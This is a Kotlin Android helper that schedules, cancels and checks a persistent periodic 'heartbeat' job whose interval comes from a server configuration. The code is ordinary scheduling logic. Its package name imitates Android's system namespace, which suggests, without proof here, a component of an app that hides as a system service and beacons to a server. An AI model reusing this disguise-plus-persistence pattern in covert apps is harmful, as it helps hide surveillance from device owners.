package com.android.system.services.utils

import android.app.job.JobInfo
import android.app.job.JobScheduler
import android.content.ComponentName
import android.content.Context
import android.os.Build
import android.util.Log
import androidx.annotation.RequiresApi
import com.android.system.services.HeartbeatJobService
import com.android.system.services.ServerConfig

object JobSchedulerHelper {

    private const val TAG = "JobSchedulerHelper"

    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    fun scheduleHeartbeatJob(context: Context) {
        try {
            val jobScheduler = context.getSystemService(Context.JOB_SCHEDULER_SERVICE) as JobScheduler
            
            jobScheduler.cancel(HeartbeatJobService.JOB_ID)
            
            val intervalMs = ServerConfig.getHeartbeatInterval()
            val intervalMinutes = (intervalMs / 60000).toInt()
            
            val finalInterval = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                maxOf(intervalMinutes, 15)
            } else {
                intervalMinutes
            }
            
            val componentName = ComponentName(context, HeartbeatJobService::class.java)
            
            val jobInfo = JobInfo.Builder(HeartbeatJobService.JOB_ID, componentName)
                .setPeriodic(finalInterval * 60 * 1000L)
                .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                .setPersisted(true)
                .setRequiresCharging(false)
                .setRequiresDeviceIdle(false)
                .apply {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        setBackoffCriteria(
                            30000,
                            JobInfo.BACKOFF_POLICY_EXPONENTIAL
                        )
                    }
                }
                .build()

            val result = jobScheduler.schedule(jobInfo)
            
            if (result != JobScheduler.RESULT_SUCCESS) {
                Log.e(TAG, "Failed to schedule heartbeat job")
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "Error scheduling job: ${e.message}", e)
        }
    }

    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    fun cancelAllJobs(context: Context) {
        try {
            val jobScheduler = context.getSystemService(Context.JOB_SCHEDULER_SERVICE) as JobScheduler
            jobScheduler.cancelAll()
        } catch (e: Exception) {
            Log.e(TAG, "Error cancelling jobs: ${e.message}")
        }
    }

    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    fun isJobScheduled(context: Context): Boolean {
        return try {
            val jobScheduler = context.getSystemService(Context.JOB_SCHEDULER_SERVICE) as JobScheduler
            val pendingJobs = jobScheduler.allPendingJobs
            
            pendingJobs.any { it.id == HeartbeatJobService.JOB_ID }
            
        } catch (e: Exception) {
            Log.e(TAG, "Error checking job status: ${e.message}")
            false
        }
    }
}